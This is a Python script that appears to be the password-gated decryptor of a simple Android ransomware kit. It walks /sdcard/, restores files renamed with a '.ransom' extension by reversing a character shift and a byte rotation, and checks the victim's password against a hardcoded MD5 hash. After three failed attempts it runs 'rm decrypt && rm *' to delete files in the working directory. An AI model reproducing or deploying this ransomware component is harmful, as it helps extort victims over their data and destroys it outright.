import os
from hashlib import md5
def decrypt_name(name):
    kay=16
    mod=26
    name=name.replace(".ransom","") 
    return ("".join('{0}'.format(chr(ord(cr)-kay%mod))for cr in name))
def decrypt_file(patho):
    i=0
    while i<11:
        i=i+1
        with open(patho,'rb') as files:
            reading=files.read()
            with open(patho,'wb') as encrypt_files:
                encrypt_files.write(reading[-20:]+reading[:-20])
def decrypt():
    for root,dirs,files in os.walk("/sdcard/"):
        for file in files:
            try:
                patho=os.path.join(root,file)
                name0='/'.join(patho.split('/')[:-1])
                x=patho.split('/')[-1]
                test=x.split('.')[-1]
                if test =="ransom":
                    name=decrypt_name(x)
                    new_name=name0+'/'+name
                    decrypt_file(patho)
                    os.rename(patho,new_name)
                else:
                    pass
            except:
                pass
if __name__=="__main__":
    t=0
    while True:
        password=md5(input("\033[31m  [?] Enter the password: ").encode()).hexdigest()
        if password == "f1c083e61b32d3a9be76bc21266b0648":
            decrypt()
            break
        else:
            t=t+1
            print ("password incorrect you havh a \033[37m"+str(4-t)+"\033[31m attempts.") 
            if t==3:
                print ('the file will be deleted now ')
                os.system("rm decrypt && rm *") 
                break 
